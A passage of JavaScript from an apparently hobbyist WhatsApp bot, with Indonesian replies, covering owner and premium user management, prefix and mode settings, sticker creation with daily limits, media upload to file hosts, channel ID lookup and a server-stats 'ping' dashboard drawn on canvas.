                if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`NOMOR ${input2} UDAH JADI OWNER, GA USH MINTA ADD LAGI!`)
                owners.push(input)
                await fs.writeFileSync("./data/owner.json", JSON.stringify(owners, null, 2))
                m.reply(`YE JADI OWNER DIA, BILANG APA SAMA OWNER UDH DI ADD`)
            }
                break

            case "listowner": case "listown": {
                if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
                let teks = `\n *乂 List all owner tambahan*\n`
                for (let i of owners) {
                    teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
                }
                sock.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: m })
            }
                break
            case "delowner": case "delown": {
                if (!isAn) return reply(mess.owner)
                if (!m.quoted && !text) return m.reply(example("LU MAU DELOWNER NOMOR NYA MANA PEA"))
                const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
                const input2 = input.split("@")[0]
                if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
                if (!owners.includes(input)) return m.reply(`NOMOR ${input2} BUKAN OWNER!`)
                let posi = owners.indexOf(input)
                await owners.splice(posi, 1)
                await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
                m.reply(`SUKSES MENGHAPUS OWNER`)
            }
                break

            case "addprem": {
                if (!isAn) return reply(mess.owner)
                if (!text && !m.quoted) return m.reply(example("NOMORNYA MANA PEA"))
                const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
                const input2 = input.split("@")[0]
                if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi premium!`)
                premium.push(input)
                await fs.writeFileSync("./data/premium.json", JSON.stringify(premium, null, 2))
                m.reply(`SUKSES MENAMBAH PREMIUM`)
            }
                break

            //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

            case "listprem": {
                if (premium.length < 1) return m.reply("Tidak ada user reseller")
                let teks = `\n *乂 List all reseller panel*\n`
                for (let i of premium) {
                    teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
                }
                sick.sendMessage(m.chat, { text: teks, mentions: premium }, { quoted: m })
            }
                break

            //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

            case "delprem": {
                if (!isAn) return reply(mess.owner)
                if (!m.quoted && !text) return m.reply(example("NOMORNYA MANA PEA"))
                const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
                const input2 = input.split("@")[0]
                if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
                if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan premium!`)
                let posi = premium.indexOf(input)
                await premium.splice(posi, 1)
                await fs.writeFileSync("./data/premium.json", JSON.stringify(premium, null, 2))
                m.reply(`SUKSES MENGHAPUS PREMIUM`)
            }
                break


            case "self": {
                if (!isAn) return m.reply(mess.owner)
                fitur.public = false

                fs.writeFileSync(dataBot, JSON.stringify(fitur, null, 2))
                m.reply("[✓] Successful change to *self*")
                break
            }

            case "public": {
                if (!isAn) return m.reply(mess.owner)
                fitur.public = true

                fs.writeFileSync(dataBot, JSON.stringify(fitur, null, 2))
                m.reply("[✓] Successful change to *public*")
                break
            }

            case "mode": {
                m.reply(
                    `*Status mode bot 🤖*
- Saat ini: *${fitur.public ? "Public mode" : "Self mode"}*

*Available Command ⚙️*
- ${prefix}self
- ${prefix}public`
                )
            }
                break

            case "setprefix": {
                if (!isAn && !isPrem) return m.reply(mess.owner)
                if (!args[0]) {
                    return m.reply(`*Usage Examples :*
› Use : ${prefix}${command} *[new prefix]*
› Example : ${prefix}${command} *🗿*

*Untuk menggunakan :*
› Ex: ${prefix}prefix on`);
                }

                const newPrefix = args[0];
                updateAndSave(newPrefix, global.multiprefix);

                let modeStatus = global.multiprefix
                    ? `Prefix mode *ON*. Pesan harus diawali dengan *${newPrefix}*.`
                    : `Prefix mode *OFF*. Bot merespons tanpa prefix, tapi *${newPrefix}* tersimpan.`;

                return m.reply(`*Prefix berhasil diubah*

› Prefix Baru: *${newPrefix}*

*⚠️ Note:* ${modeStatus}`);
            }
                break

            case 'delprefix': {
                if (!isAn && !isPrem) return m.reply(mess.owner)
                updateAndSave('.', global.multiprefix);

                return m.reply(`Berhasil riset prefix menjadi default *"."* 

*Setting prefix ulang :*
› Ex: *${prefix}setprefix*`);
            }
                break;

            case 'prefix': {
                let type = args[0] ? args[0].toLowerCase() : '';

                switch (type) {
                    case 'on':
                        if (!isAn) return m.reply(mess.owner);
                        if (global.multiprefix) {
                            return m.reply(`[✓] - *Sudah aktif!*

*Prefix info :*
› Prefix aktif: ${global.prefix || '*.*'}

*Settings prefix ulang :*
› Ex: *${prefix}setprefix*`);
                        }

                        updateAndSave(global.prefix, true);

                        return m.reply(`[✓] - *Successfully activated prefix!*

*Prefix info :*
› Prefix aktif: ${global.prefix || '*.*'}

*Settings prefix ulang :*
› Ex: *${prefix}setprefix*`);

                    case 'off':
                        if (!isAn) return m.reply(mess.owner);
                        if (!global.multiprefix) {
                            return m.reply(`[✓] - *Sudah dalam mode offline*
*Prefix info :*
› Prefix aktif: *tanpa prefix*`);
                        }

                        updateAndSave(global.prefix, false);

                        return m.reply(`[✓] - *Offline prefix mode!*

*Prefix info :*
› Prefix aktif: *tanpa prefix*`);

                    default:
                        if (!isAn) return m.reply(mess.owner);
                        let status = global.multiprefix ? 'ON' : 'OFF';
                        let savedPrefixDisplay = global.prefix || '**.**';
                        let activePrefix = global.multiprefix ? savedPrefixDisplay : 'no prefix!';

                        let helpMessage = `*Prefix Settings ⚙️*
› Mode prefix: *${status}*
› Prefix tersimpan: *${savedPrefixDisplay}*
› Prefix aktif: *${activePrefix}*

*Available Commands ✅*
› *${prefix}prefix on* /menggunakan tersimpan 
› *${prefix}prefix off* /mode tanpa prefix 
› *${prefix}setprefix* /custom new prefix
› *${prefix}delprefix* /riset prefix`;
                        m.reply(helpMessage);
                }
            }
                break

            // ** case other menu **
            case 'totalfitur': {

                const scriptContent = fs.readFileSync(__filename, 'utf-8');
                const casePattern = /case\s+['"]([^'"]+)['"]/g;
                const matches = scriptContent.match(casePattern);
                const total = matches ? matches.length : 0;

                m.reply(`🤖 *${global.namaBot}* memiliki total fitur *${total}*`);
            }
                break;

            case "s": case "sticker": case "stiker": {
                // 1. Sinkronisasi & Reset Limit Harian
                db.checkAndResetLimit(m.sender, isAn, isPrem);

                // 2. Validasi Sisa Limit (Owner tidak terkena validasi ini)
                if (!isAn && !db.hasLimit(m.sender)) {
                    let txtLimit = `❌ *ACCESS DITOLAK!*\n\n`;
                    txtLimit += `Limit harian kamu sudah habis!\n`;
                    txtLimit += `Tunggu besok hari untuk reset otomatis, atau upgrade ke *Premium* untuk limit tanpa batas.\n`;
                    txtLimit += `> Ketik *${prefix}owner* untuk info Premium.`;

                    return reply(txtLimit);
                }

                // Validasi Media
                if (!/image|video/.test(mime))
                    return reply(`Kirim atau reply foto/video dengan caption *${prefix + command}*`);

                if (/video/.test(mime)) {
                    if ((qmsg.seconds || 0) > 15)
                        return reply("Durasi video maksimal 15 detik!");
                }

                // 3. Potong Limit (karena user mengirim format yang benar & proses berjalan)
                if (!isAn) {
                    db.decrementLimit(m.sender);
                }

                // Proses Pembuatan Sticker
                try {
                    // Info proses
                    await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                    const mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);

                    await sock.sendImageAsSticker(
                        m.chat,
                        mediaPath,
                        m,
                        { author: global.author }
                    );

                    // hapus file sementara
                    fs.unlinkSync(mediaPath);
                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (err) {
                    console.error(err);
                    reply("❌ Gagal membuat sticker!");
                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                }
            }
                break

            case "brat": {
                if (!text) return m.reply(`Contoh: ${prefix}brat hai`)
                if (text.length > 250) return m.reply(`Karakter terbatas, max 250!`)

                const encode = encodeURIComponent(text)
                const jion = `https://api.siputzx.my.id/api/m/brat?text=${encode}&isAnimated=false&delay=500`

                await sock.sendImageAsSticker(m.chat, jion, m, {
                    packname: global.packname,
                    author: global.author,
                })
            }
                break

            case 'tourl':
            case 'tolink': {  // Sekarang satu command saja, mendukung semua host
                if (!/image|video|audio/.test(mime))
                    return reply(`❌ Reply atau kirim media (foto/video/audio) lalu ketik *${prefix}tourl*`);

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                try {
                    const media = await quoted.download(); // download media
                    const ext = mime.split('/')[1] || 'jpg';

                    const result = await tourl(media, '.' + ext);

                    let teks = `✅ *MEDIA BERHASIL DIUPLOAD*\n\n`;

                    if (result.catbox) teks += `🔥 Catbox : ${result.catbox}\n`;
                    if (result.quax) teks += `🔥 Qu.ax   : ${result.quax}\n`;
                    if (result.termai) teks += `🔥 Termai  : ${result.termai}\n`;
                    if (result.pixhost) teks += `🔥 Pixhost : ${result.pixhost}\n`;

                    teks += `\n> Paling atas = paling cepat & stabil`;

                    await sock.sendMessage(m.chat, { text: teks }, { quoted: m });
                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (err) {
                    console.error("Tourl Error:", err);
                    reply("❌ Gagal mengupload media. Coba lagi.");
                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                }
            }
                break;





            case "cekidch":
                {
                    if (!text) {
                        return m.reply(example("linkchnya mana"));
                    }
                    if (!text.includes("https://whatsapp.com/channel/")) {
                        return m.reply("Link tautan tidak valid");
                    }
                    let result = text.split("https://whatsapp.com/channel/")[1];
                    let res = await sock.newsletterMetadata("invite", result);
                    let teks = `* *ID : ${res.id}*
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`;
                    let msg = generateWAMessageFromContent(m.chat, {
                        viewOnceMessage: {
                            message: {
                                messageContextInfo: {
                                    deviceListMetadata: {},
                                    deviceListMetadataVersion: 2
                                },
                                interactiveMessage: {
                                    body: {
                                        text: teks
                                    },
                                    footer: {
                                        text: "By @VannessWangsaff"
                                    },
                                    //input watermark footer
                                    nativeFlowMessage: {
                                        buttons: [{
                                            name: "cta_copy",
                                            buttonParamsJson: `{"display_text": "GET COPY ID","copy_code": "${res.id}"}`
                                        }]
                                    }
                                }
                            }
                        }
                    }, {
                        quoted: m
                    });
                    await sock.relayMessage(msg.key.remoteJid, msg.message, {
                        messageId: msg.key.id
                    });
                }
                break;


            case "ping": case "os": {
                try {
                    const THEME = {
                        bg: "#0f1419", bgSecondary: "#1a1f2e", card: "#1e2433", cardHover: "#252b3d",
                        primary: "#3b82f6", success: "#10b981", warning: "#f59e0b", danger: "#ef4444",
                        purple: "#8b5cf6", cyan: "#06b6d4", pink: "#ec4899", textPrimary: "#f1f5f9",
                        textSecondary: "#94a3b8", textTertiary: "#64748b", border: "#2d3548", glow: "rgba(59, 130, 246, 0.2)"
                    };

                    const formatSize = (bytes) => {
                        if (bytes === 0) return '0 B';
                        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
                        const i = Math.floor(Math.log(bytes) / Math.log(1024));
                        return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
                    };

                    const formatTime = (seconds) => {
                        seconds = Number(seconds);
                        const d = Math.floor(seconds / (3600 * 24));
                        const h = Math.floor(seconds % (3600 * 24) / 3600);
                        const m = Math.floor(seconds % 3600 / 60);
                        const s = Math.floor(seconds % 60);
                        if (d > 0) return `${d}d ${h}h ${m}m`;
                        if (h > 0) return `${h}h ${m}m`;
                        return `${m}m ${s}s`;
                    };

                    function drawBackground(ctx, w, h) {
                        const gradient = ctx.createLinearGradient(0, 0, w, h);
                        gradient.addColorStop(0, THEME.bg);
                        gradient.addColorStop(0.5, THEME.bgSecondary);
                        gradient.addColorStop(1, THEME.bg);
                        ctx.fillStyle = gradient;
                        ctx.fillRect(0, 0, w, h);
                        ctx.globalAlpha = 0.02;
                        for (let i = 0; i < 100; i++) {
                            const x = Math.random() * w;
                            const y = Math.random() * h;
                            const size = Math.random() * 2;
                            ctx.fillStyle = THEME.textPrimary;
                            ctx.beginPath();
                            ctx.arc(x, y, size, 0, Math.PI * 2);
                            ctx.fill();
                        }
                        ctx.globalAlpha = 1;
                        ctx.strokeStyle = THEME.border;
                        ctx.lineWidth = 1;
                        for (let i = 0; i < w; i += 50) {
                            ctx.globalAlpha = 0.03;
                            ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, h); ctx.stroke();
                        }
                        for (let i = 0; i < h; i += 50) {
                            ctx.globalAlpha = 0.03;
                            ctx.beginPath(); ctx.moveTo(0, i); ctx.lineTo(w, i); ctx.stroke();
                        }
                        ctx.globalAlpha = 1;
                    }

                    function drawCard(ctx, x, y, w, h, radius) {
                        ctx.save();
                        ctx.shadowColor = THEME.glow;
                        ctx.shadowBlur = 15;
                        ctx.beginPath();
                        ctx.roundRect(x, y, w, h, radius);
                        ctx.fillStyle = THEME.card;
                        ctx.fill();
                        ctx.shadowBlur = 0;
                        ctx.strokeStyle = THEME.border;
                        ctx.lineWidth = 1;
                        ctx.stroke();
                        ctx.restore();
                    }

                    function drawIcon(ctx, x, y, type, color) {
                        ctx.save();
                        ctx.strokeStyle = color;
                        ctx.fillStyle = color;
                        ctx.lineWidth = 2.5;
                        ctx.lineCap = 'round';
                        ctx.lineJoin = 'round';
                        switch (type) {
                            case 'cpu':
                                ctx.strokeRect(x - 12, y - 12, 24, 24);
                                ctx.fillRect(x - 6, y - 6, 12, 12);
                                ctx.beginPath();
                                ctx.moveTo(x - 12, y - 8); ctx.lineTo(x - 16, y - 8);
                                ctx.moveTo(x - 12, y); ctx.lineTo(x - 16, y);
                                ctx.moveTo(x - 12, y + 8); ctx.lineTo(x - 16, y + 8);
                                ctx.moveTo(x + 12, y - 8); ctx.lineTo(x + 16, y - 8);
                                ctx.moveTo(x + 12, y); ctx.lineTo(x + 16, y);
                                ctx.moveTo(x + 12, y + 8); ctx.lineTo(x + 16, y + 8);
                                ctx.stroke();
                                break;
                            case 'memory':
                                for (let i = 0; i < 4; i++) { ctx.strokeRect(x - 10 + i * 6, y - 12, 5, 24); }
                                break;
                            case 'disk':
                                ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                                ctx.beginPath(); ctx.arc(x, y, 8, 0, Math.PI * 2); ctx.stroke();
                                ctx.beginPath(); ctx.arc(x, y, 3, 0, Math.PI * 2); ctx.fill();
                                break;
                            case 'network':
                                ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                                ctx.beginPath(); ctx.moveTo(x, y - 8); ctx.lineTo(x, y + 8);
                                ctx.moveTo(x - 8, y); ctx.lineTo(x + 8, y); ctx.stroke();
                                ctx.beginPath(); ctx.arc(x - 6, y - 6, 2, 0, Math.PI * 2);
                                ctx.arc(x + 6, y - 6, 2, 0, Math.PI * 2);
                                ctx.arc(x - 6, y + 6, 2, 0, Math.PI * 2);
                                ctx.arc(x + 6, y + 6, 2, 0, Math.PI * 2);
                                ctx.fill();
                                break;
                            case 'server':
                                for (let i = 0; i < 3; i++) {
                                    ctx.strokeRect(x - 12, y - 10 + i * 8, 24, 6);
                                    ctx.beginPath(); ctx.arc(x + 8, y - 7 + i * 8, 1.5, 0, Math.PI * 2); ctx.fill();
                                }
                                break;
                            case 'clock':
                                ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                                ctx.beginPath(); ctx.moveTo(x, y); ctx.lineTo(x, y - 8);
                                ctx.moveTo(x, y); ctx.lineTo(x + 6, y); ctx.stroke();
                                break;
                        }
                        ctx.restore();
                    }

                    function drawLogo(ctx, x, y, size) {
                        ctx.save();
                        const gradient = ctx.createLinearGradient(x - size, y - size, x + size, y + size);
                        gradient.addColorStop(0, THEME.primary);
                        gradient.addColorStop(0.5, THEME.cyan);
                        gradient.addColorStop(1, THEME.purple);
                        ctx.strokeStyle = gradient;
                        ctx.lineWidth = 3;
                        ctx.lineCap = 'round';
                        ctx.beginPath(); ctx.moveTo(x - size, y); ctx.lineTo(x, y - size); ctx.lineTo(x + size, y); ctx.lineTo(x, y + size); ctx.closePath(); ctx.stroke();
                        ctx.beginPath(); ctx.moveTo(x - size / 2, y); ctx.lineTo(x, y - size / 2); ctx.lineTo(x + size / 2, y); ctx.lineTo(x, y + size / 2); ctx.closePath(); ctx.stroke();
                        ctx.restore();
                    }

                    function drawDonutChart(ctx, x, y, radius, lineWidth, percent, color) {
                        ctx.save();
                        ctx.lineCap = 'round';
                        ctx.beginPath(); ctx.arc(x, y, radius, 0, Math.PI * 2);
                        ctx.strokeStyle = THEME.bgSecondary; ctx.lineWidth = lineWidth; ctx.stroke();
                        const startAngle = -Math.PI / 2;
                        const endAngle = startAngle + (Math.PI * 2 * (percent / 100));
                        ctx.shadowColor = color; ctx.shadowBlur = 10;
                        ctx.beginPath(); ctx.arc(x, y, radius, startAngle, endAngle);
                        ctx.strokeStyle = color; ctx.lineWidth = lineWidth; ctx.stroke();
                        ctx.shadowBlur = 0;
                        ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 28px Arial";
                        ctx.textAlign = "center"; ctx.textBaseline = "middle";
                        ctx.fillText(`${Math.round(percent)}%`, x, y);
                        ctx.restore();
                    }

                    function drawProgressBar(ctx, x, y, w, h, percent, color, label, value) {
                        ctx.fillStyle = THEME.bgSecondary; ctx.fillRect(x, y, w, h);
                        const gradient = ctx.createLinearGradient(x, y, x + w, y);
                        gradient.addColorStop(0, color); gradient.addColorStop(1, color + 'aa');
                        ctx.fillStyle = gradient; ctx.fillRect(x, y, w * (percent / 100), h);
                        ctx.strokeStyle = THEME.border; ctx.lineWidth = 1; ctx.strokeRect(x, y, w, h);
                        ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.textAlign = "left"; ctx.fillText(label, x, y - 6);
                        ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 11px Arial"; ctx.textAlign = "right"; ctx.fillText(value, x + w, y - 6);
                    }

                    function drawStatBox(ctx, x, y, w, h, label, value, color, iconType) {
                        drawCard(ctx, x, y, w, h, 12);
                        drawIcon(ctx, x + 28, y + 28, iconType, color);
                        ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.textAlign = "left"; ctx.fillText(label, x + 50, y + 22);
                        ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 16px Arial"; ctx.fillText(value, x + 50, y + 40);
                    }

                    async function renderDashboard(stats) {
                        const W = 1200;
                        const H = 800;
                        const canvas = createCanvas(W, H);
                        const ctx = canvas.getContext('2d');

                        drawBackground(ctx, W, H);
                        drawLogo(ctx, 60, 50, 20);

                        ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 32px Arial"; ctx.textAlign = "left"; ctx.fillText("SYSTEM MONITOR", 100, 58);
                        ctx.fillStyle = THEME.textSecondary; ctx.font = "13px Arial"; ctx.fillText("Real-time Performance Dashboard", 100, 80);

                        const pingStatus = stats.ping < 100 ? THEME.success : stats.ping < 300 ? THEME.warning : THEME.danger;
                        ctx.fillStyle = pingStatus; ctx.font = "bold 28px Arial"; ctx.textAlign = "right"; ctx.fillText(`${stats.ping}ms`, W - 50, 50);
                        ctx.fillStyle = THEME.textSecondary; ctx.font = "12px Arial"; ctx.fillText("LATENCY", W - 50, 70);

                        const gradient = ctx.createLinearGradient(50, 100, W - 50, 100);
                        gradient.addColorStop(0, THEME.primary); gradient.addColorStop(0.33, THEME.success); gradient.addColorStop(0.66, THEME.purple); gradient.addColorStop(1, THEME.cyan);
                        ctx.strokeStyle = gradient; ctx.lineWidth = 2; ctx.beginPath(); ctx.moveTo(50, 100); ctx.lineTo(W - 50, 100); ctx.stroke();

                        const mainY = 130, cardW = 260, cardH = 240, gap = 30;
                        const x1 = 50, x2 = x1 + cardW + gap, x3 = x2 + cardW + gap, x4 = x3 + cardW + gap;

                        drawCard(ctx, x1, mainY, cardW, cardH, 15);
                        drawIcon(ctx, x1 + 30, mainY + 35, 'cpu', THEME.primary);
                        ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("CPU USAGE", x1 + 55, mainY + 40);
                        ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`${stats.cpuCores} Cores @ ${stats.cpuSpeed} MHz`, x1 + 55, mainY + 58);
                        drawDonutChart(ctx, x1 + cardW / 2, mainY + 140, 50, 12, stats.cpuLoad, THEME.primary);
                        ctx.fillStyle = THEME.textTertiary; ctx.font = "10px Arial"; ctx.textAlign = "center"; ctx.fillText(stats.cpuModel.substring(0, 32), x1 + cardW / 2, mainY + 215);

                        drawCard(ctx, x2, mainY, cardW, cardH, 15);
                        drawIcon(ctx, x2 + 30, mainY + 35, 'memory', THEME.success);
                        ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("MEMORY", x2 + 55, mainY + 40);
                        ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Total: ${formatSize(stats.ramTotal)}`, x2 + 55, mainY + 58);
                        const ramPercent = (stats.ramUsed / stats.ramTotal) * 100;
                        drawDonutChart(ctx, x2 + cardW / 2, mainY + 140, 50, 12, ramPercent, THEME.success);
                        ctx.fillStyle = THEME.textTertiary; ctx.font = "11px Arial"; ctx.textAlign = "center"; ctx.fillText(`${formatSize(stats.ramUsed)} Used`, x2 + cardW / 2, mainY + 205); ctx.fillText(`${formatSize(stats.ramTotal - stats.ramUsed)} Free`, x2 + cardW / 2, mainY + 220);

                        drawCard(ctx, x3, mainY, cardW, cardH, 15);
                        drawIcon(ctx, x3 + 30, mainY + 35, 'disk', THEME.purple);
                        ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("STORAGE", x3 + 55, mainY + 40);
                        ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Total: ${formatSize(stats.diskTotal)}`, x3 + 55, mainY + 58);
                        let diskPercent = stats.diskTotal > 0 ? (stats.diskUsed / stats.diskTotal) * 100 : 0;
                        drawDonutChart(ctx, x3 + cardW / 2, mainY + 140, 50, 12, diskPercent, THEME.purple);
                        ctx.fillStyle = THEME.textTertiary; ctx.font = "11px Arial"; ctx.textAlign = "center"; ctx.fillText(`${formatSize(stats.diskUsed)} Used`, x3 + cardW / 2, mainY + 205); ctx.fillText(`${formatSize(stats.diskTotal - stats.diskUsed)} Free`, x3 + cardW / 2, mainY + 220);

                        drawCard(ctx, x4, mainY, cardW, cardH, 15);
                        drawIcon(ctx, x4 + 30, mainY + 35, 'network', THEME.cyan);
                        ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("NETWORK", x4 + 55, mainY + 40);
                        ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Interface: ${stats.networkInterface}`, x4 + 55, mainY + 58);
                        ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.textAlign = "left"; ctx.fillText("RX (Download)", x4 + 30, mainY + 95);
                        ctx.fillStyle = THEME.cyan; ctx.font = "bold 20px Arial"; ctx.fillText(formatSize(stats.networkRx), x4 + 30, mainY + 120);
                        ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.fillText("TX (Upload)", x4 + 30, mainY + 155);
                        ctx.fillStyle = THEME.pink; ctx.font = "bold 20px Arial"; ctx.fillText(formatSize(stats.networkTx), x4 + 30, mainY + 180);

                        const statsY = 400, statW = 175, statH = 70, statGap = 20;
                        drawStatBox(ctx, 50, statsY, statW, statH, "HOSTNAME", stats.hostname.substring(0, 15), THEME.primary, 'server');
                        drawStatBox(ctx, 50 + (statW + statGap), statsY, statW, statH, "PLATFORM", `${stats.platform} (${stats.arch})`, THEME.success, 'server');
                        drawStatBox(ctx, 50 + (statW + statGap) * 2, statsY, statW, statH, "BOT UPTIME", stats.uptimeBot, THEME.purple, 'clock');
                        drawStatBox(ctx, 50 + (statW + statGap) * 3, statsY, statW, statH, "SERVER UPTIME", stats.uptimeServer, THEME.warning, 'clock');
                        drawStatBox(ctx, 50 + (statW + statGap) * 4, statsY, statW, statH, "NODE.JS", stats.nodeVersion, THEME.cyan, 'server');

                        const perfY = 500, perfH = 250, perfW = W - 100;
                        drawCard(ctx, 50, perfY, perfW, perfH, 15);
                        ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 20px Arial"; ctx.textAlign = "left"; ctx.fillText("SYSTEM PERFORMANCE", 75, perfY + 35);
                        ctx.fillStyle = THEME.textSecondary; ctx.font = "12px Arial"; ctx.fillText("Real-time resource monitoring", 75, perfY + 55);

                        const barY = perfY + 85, barW = 500, barH = 18, barGap = 35;
                        drawProgressBar(ctx, 75, barY, barW, barH, stats.cpuLoad, THEME.primary, "CPU Load", `${stats.cpuLoad}%`);
                        drawProgressBar(ctx, 75, barY + barGap, barW, barH, ramPercent, THEME.success, "Memory Usage", `${Math.round(ramPercent)}%`);
                        drawProgressBar(ctx, 75, barY + barGap * 2, barW, barH, diskPercent, THEME.purple, "Disk Usage", `${Math.round(diskPercent)}%`);
                        drawProgressBar(ctx, 75, barY + barGap * 3, barW, barH, Math.min(100, (stats.ping / 500) * 100), pingStatus, "Network Latency", `${stats.ping}ms`);

                        const infoX = 620, infoStartY = perfY + 85, infoLineHeight = 28;
                        let infoY = infoStartY;
                        ctx.font = "13px Arial"; ctx.textAlign = "left";
                        const drawInfoLine = (label, value) => {
                            ctx.fillStyle = THEME.textSecondary; ctx.fillText(label, infoX, infoY);
                            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.fillText(value, infoX + 150, infoY);
                            ctx.font = "13px Arial"; infoY += infoLineHeight;
                        };
                        drawInfoLine("OS Release", stats.release);
                        drawInfoLine("CPU Cores", `${stats.cpuCores} Cores`);
                        drawInfoLine("CPU Speed", `${stats.cpuSpeed} MHz`);
                        drawInfoLine("Total Memory", formatSize(stats.ramTotal));
                        drawInfoLine("Free Memory", formatSize(stats.ramTotal - stats.ramUsed));
                        ctx.fillStyle = THEME.textTertiary; ctx.font = "10px Arial"; ctx.textAlign = "center"; ctx.fillText(`Dashboard Generated: ${new Date().toLocaleString()}`, W / 2, H - 20);
                        return canvas.toBuffer('image/png');
                    }

                    function getNetworkStats() {
                        try {
                            const interfaces = os.networkInterfaces();
                            let totalRx = 0, totalTx = 0, activeInterface = 'N/A', ip = 'N/A';
                            for (const [name, addrs] of Object.entries(interfaces)) {
                                if (name.toLowerCase().includes('lo')) continue;
                                for (const addr of addrs) {
                                    if (addr.family === 'IPv4' && !addr.internal) { activeInterface = name; ip = addr.address; break; }
                                }
                            }
                            try {
                                const netstat = execSync("cat /proc/net/dev 2>/dev/null || echo ''").toString();
                                const lines = netstat.split('\n');
                                for (const line of lines) {
                                    if (line.includes(':') && !line.includes('lo:')) {
                                        const parts = line.trim().split(/\s+/);
                                        if (parts.length >= 10) { totalRx += parseInt(parts[1]) || 0; totalTx += parseInt(parts[9]) || 0; }
                                    }
                                }
                            } catch (e) { }
                            return { totalRx, totalTx, activeInterface, ip };
                        } catch (e) {
                            return { totalRx: 0, totalTx: 0, activeInterface: 'N/A', ip: 'N/A' };
                        }
                    }

                    const start = performance.now();
                    await new Promise(resolve => setTimeout(resolve, 10));
                    const end = performance.now();
                    const latency = (end - start).toFixed(2);

                    const cpus = os.cpus();
                    const totalMem = os.totalmem();
                    const freeMem = os.freemem();
                    const loadAvg = os.loadavg();
                    const cpuPercent = Math.min(100, (loadAvg[0] * 100) / cpus.length).toFixed(1);

                    let diskTotal = 0, diskUsed = 0;
                    try {
                        const df = execSync("df -k --output=size,used / 2>/dev/null").toString();
                        const lines = df.trim().split("\n");
                        if (lines.length > 1) {
                            const [total, used] = lines[1].trim().split(/\s+/).map(Number);
                            diskTotal = total * 1024;
                            diskUsed = used * 1024;
                        }
                    } catch (e) { }

                    const networkStats = getNetworkStats();

                    const stats = {
                        ping: latency,
                        hostname: os.hostname(),
                        platform: os.platform(),
                        arch: os.arch(),
                        release: os.release(),
                        nodeVersion: process.version,
                        uptimeBot: formatTime(process.uptime()),
                        uptimeServer: formatTime(os.uptime()),
                        cpuModel: cpus[0].model.trim(),
                        cpuSpeed: cpus[0].speed,
                        cpuCores: cpus.length,
                        cpuLoad: cpuPercent,
                        ramTotal: totalMem,
                        ramUsed: totalMem - freeMem,
                        diskTotal: diskTotal,
                        diskUsed: diskUsed,
                        networkRx: networkStats.totalRx,
                        networkTx: networkStats.totalTx,
                        networkInterface: networkStats.activeInterface,
                        networkIP: networkStats.ip
                    };

                    const imageBuffer = await renderDashboard(stats);

                    await sock.sendMessage(m.chat, {
                        image: imageBuffer,
                        caption: `*SERVER - INFORMATION 🚀*\n\n` +
                            `- Latency: ${latency}ms\n` +
                            `- CPU: ${stats.cpuLoad}%\n` +
                            `- RAM: ${formatSize(stats.ramUsed)} / ${formatSize(stats.ramTotal)}\n` +
                            `- Disk: ${formatSize(stats.diskUsed)} / ${formatSize(stats.diskTotal)}\n` +
                            `- Network: ↓${formatSize(stats.networkRx)} ↑${formatSize(stats.networkTx)}`
                    }, {
                        quoted: m
                    });

                } catch (e) {
                    console.error(e);
                    m.reply(`Error: ${e.message}`);
                }
            }
                break;

            case "own": case "owner": {
